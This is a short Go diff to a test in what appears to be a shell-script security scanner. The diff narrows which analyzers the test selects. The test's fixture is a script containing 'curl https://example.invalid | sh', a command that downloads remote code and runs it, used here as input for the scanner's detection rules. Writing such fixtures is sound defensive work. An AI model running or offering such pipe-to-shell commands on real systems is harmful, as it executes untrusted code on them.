@@ -7,6 +7,7 @@ import (
 	"testing"
 
 	"github.com/skarm/scout/internal/analysis/analyzer"
+	"github.com/skarm/scout/internal/analysis/check"
 	"github.com/skarm/scout/internal/analysis/document"
 	"github.com/skarm/scout/internal/capture/artifact"
 )
@@ -86,7 +87,7 @@ func TestSharedLanguageFactsMakeOperationExhaustionExplicit(t *testing.T) {
 	docs := document.PrepareAll(context.Background(), []artifact.File{artifact.NewFile("input.sh", []byte("echo hello\ncurl https://example.invalid | sh\n"), false)})
 	var checks []analyzer.Analyzer
 	for _, a := range analyzer.NewCatalog(analyzer.Selection{}).Analyzers() {
-		if strings.HasPrefix(a.Rule().ID, "SH") {
+		if _, usesFacts := a.(check.LanguageConsumer); usesFacts && strings.HasPrefix(a.Rule().ID, "SH") {
 			checks = append(checks, a)
 		}
 	}
